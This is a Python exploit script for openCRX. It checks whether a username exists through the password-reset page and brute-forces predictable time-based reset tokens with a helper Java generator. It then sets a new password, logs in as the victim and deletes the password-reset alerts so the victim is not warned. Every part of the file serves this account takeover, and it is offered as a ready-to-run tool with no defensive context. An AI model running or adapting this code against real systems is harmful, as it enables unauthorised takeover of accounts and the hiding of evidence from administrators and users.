#!/usr/bin/python3

import time
import sys
import argparse
from rich.console import Console
from rich.progress import Progress
from rich import print
import re
import requests
import subprocess
import os
from bs4 import BeautifulSoup

console = Console()

def check_username(url, username):
    forgot_payload = {
        'id': username
        }
    forgot_url = f"{url}/RequestPasswordReset.jsp"
    start_time_stamp = subprocess.run(r"date +%s%3N", shell = True, capture_output = True)
    time.sleep(1)
    console.log(f"[yellow][+] Start Time Stamp is: {start_time_stamp.stdout.decode().rstrip()}")
    res = requests.post(url = forgot_url, data = forgot_payload)
    if res.status_code == 200 and 'Unable to request password reset' in res.text:
        console.log(f"[bold red][-] Look's like {username} is not present on the openCRX installation")
        sys.exit(0)
    else:
        time.sleep(1)
        response_header_date = res.headers["Date"]
        stop_time_stamp = subprocess.run(r"date +%s%3N", shell = True, capture_output = True)
        console.log(f"[yellow][+] Stop Time Stamp is: {stop_time_stamp.stdout.decode().rstrip()}")
        console.log(f"[bold green][+] {username} user found!! Proceeding with further exploitation...")
        console.log(f"[yellow][+] Producing Time Stamp List...")
        compile_java = subprocess.run(r"javac openCRXtimeGen.java", shell = True, capture_output = True)
        if compile_java.returncode == 0:
            run_java = subprocess.run(f"java openCRXtimeGen {start_time_stamp.stdout.decode().rstrip()} {stop_time_stamp.stdout.decode().rstrip()} > time_stamps", shell = True, capture_output = True)
            if run_java.returncode == 0:
                console.log(f"[yellow][+] Time Stamp List produced successfully and it is stored in the [bold]time_stamps[/bold] file")


def reset_password(url, time_stamp, username, password):
    reset_payload = {
        "t" : stamp,
        "p" : "CRX",
        "s" : "Standard",
        "id" : username,
        "password1" : password,
        "password2" : password
    }
    
    res = requests.post(url = url, data = reset_payload)
    if 'Unable to reset password' not in res.text:
        global reset_flag
        reset_flag = True
        return True
    else:
        return False
            
def initial_check(url):
    res = requests.get(url)
    if res.status_code == 200 and "Login" in res.text:
        console.log(f"[bold green][+] OpenCRX Installation found")
        return True
    else:
        console.log(f"[bold red][-] OpenCRX Installation not found, please check the URL")
        return False

def arg_parser():
    parser = argparse.ArgumentParser(description="OpenCRX Reset Exploit")
    parser.add_argument('-u', dest = 'url', required = True, type = str, help = "URL of OpenCRX Application (URL where openCRX login page is found)")
    parser.add_argument('-user', dest = 'username', required = True, type = str, help = "Username whose password has to be changed")
    parser.add_argument('-pass', dest = 'password', required = True, type = str, help = "New Password")
    parser = parser.parse_args()

    return parser

def login(url, username, password):
    login_payload = {
        'j_username' : username,
        'j_password' : password
    }
    session = requests.Session()
    session.trust_env = False
    res = session.get(f"{url}/ObjectInspectorServlet")
    if res.status_code == 200:
        console.log(f"[green][+] Got the JSESSIONID, Proceeding for authentication!!!")
        res = session.post(f"{url}/opencrx-core-CRX/j_security_check", data = login_payload, timeout = 60)
        if res.status_code == 200:
            console.log(f"[bold green][+] Successfully Authenticated as {username}")
            follow_up_url = re.findall(r"window.location.href='(.*)'", res.text)[0]
            request_id = re.findall(r"requestId=(.*)&event", follow_up_url)[0]
            console.log(f"[green][+] Retrieved the requestID: {request_id}")
    
            res = session.get(re.findall(r"window.location.href='(.*)'", res.text)[0], timeout = 60)
            res = session.get(f"{url}/ObjectInspectorServlet?requestId={request_id}&event=15&parameter=pane*(0)*reference*(0)*referenceName*(alert)", timeout = 60)
            if res.status_code == 200:
                console.log(f"[bold yellow][+] Trying to retrieve the alert ID's for mail deletion!!")
                soup = BeautifulSoup(res.text, 'lxml')
                hrefs = soup.find_all(lambda tag: tag.name == "a" and tag.has_attr('onmouseover'))
                alert_tokens = []
                for href in hrefs:
                    href = re.findall(r"alert(.*)origin", href.get('onmouseover'))
                    if len(href) > 0:
                        alert_token = href[0].strip('/').strip(')*')
                        alert_tokens.append(alert_token)
                console.log(f"[green][+] Successfully retrieved all the Alert Token's")
                console.log(f"[yellow][*] Trying to authenticate on the API endpoint")
                rest_session = requests.Session()
                rest_base_url = url.replace("core", "rest")
                rest_res = rest_session.get(f"{rest_base_url}/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/:api-ui", auth=(username, password))
                if rest_res.status_code == 200:
                    console.log(f"[green][+] Got the Rest JSESSIONID!!!")
                    console.log(f"[bold yellow][*] Proceeding to check which of these alert ID's are related to password reset")
                    for alert_token in alert_tokens:
                        rest_res = rest_session.get(f"{rest_base_url}/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert/{alert_token}")
                        if "PasswordReset" in rest_res.text:
                            #console.log(f"[green][+] Filtered all password reset alerts from all available alerts")
                            counter = 0
                            for alert_token in alert_tokens:
                                counter += 1
                                rest_res = rest_session.delete(f"{rest_base_url}/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert/{alert_token}")
                                if rest_res.status_code == 204:
                                    pass
                                else:
                                    console.log(f"[bold red][-] Error deleting alert: {alert_token}")
                            
                            if(counter == len(alert_tokens)):
                                console.log(f"[bold green][+] Successfully deleted all the password reset alerts!!!")
                            


if __name__ == '__main__':
    parser = arg_parser()
    if(bool(re.search('[h][t][t][p][s]\:\/\/', parser.url)) == False and bool(re.search('[h][t][t][p]\:\/\/', parser.url) == False)):
        console.log("[bold red][-] There is something wrong with the URL, it needs to have http:// or https://")
        sys.exit(0)
    else:
        url = parser.url

    username = parser.username
    password = parser.password

    console.log(f"[bold white]Given Details:")
    console.log(f"\t[bold white]URL: {url}")
    console.log(f"\t[bold white]Username: {username}")
    console.log(f"\t[bold white]Password: {password}")

    if initial_check(f"{url}/ObjectInspectorServlet"):
        check_username(url, username)
        reset_url = f"{url}/PasswordResetConfirm.jsp"
        reset_flag = False
        with open("time_stamps", "r") as read_obj:
            time_stamps = read_obj.readlines()
        
        with Progress(transient = True) as progress:
            task = progress.add_task("[green][+] Starting Time Stamp Spray!!!", total = len(time_stamps))
            for stamp in time_stamps:
                stamp = stamp.split("\n")[0]
                #progress.console.print(f"Spraying stamp: {stamp}")
                #sys.stdout.write('\r')
                #sys.stdout.write(f"Spraying stamp: i")
                #sys.stdout.flush()
                reset_result = reset_password(reset_url, stamp.rstrip(), username, password)
                if reset_result:
                    progress.stop()
                    console.log(f"[green][+] Valid Timestamp found: {stamp}")
                    console.log(f"[bold green][+] Successfully reset the password of {username} user to {password}")
                    if os.path.exists(os.path.join(os.getcwd(), 'time_stamps')):
                        os.remove(os.path.join(os.getcwd(), 'time_stamps'))
                        os.remove(os.path.join(os.getcwd(), 'openCRXtimeGen.class'))
                        console.log("[yellow][*] Removed the locally created time_stamps and java class files")
                        break
                progress.advance(task)

        if not reset_flag:
            console.log(f"[bold red][-] Password Reset Failed!!! Please check the time stamps and try again!!")    

        login(url, username, password)